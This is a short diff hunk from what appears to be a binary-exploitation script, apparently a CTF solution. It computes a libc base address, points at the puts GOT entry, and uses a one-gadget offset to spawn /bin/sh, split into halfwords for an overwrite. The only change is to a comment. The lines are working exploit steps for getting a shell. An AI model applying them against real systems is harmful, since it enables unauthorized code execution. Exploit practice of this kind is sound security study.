@@ -315,7 +315,7 @@ libc_base = libc_start_main - 132928
 # location of pointer to <puts@plt>
 puts = 0x601018
 
-# system("/bin/sh") gadget location
+# execve("/bin/sh") gadget location
 system = libc_base + 0x4526a
 
 # split into three halfword sections of system gadget address
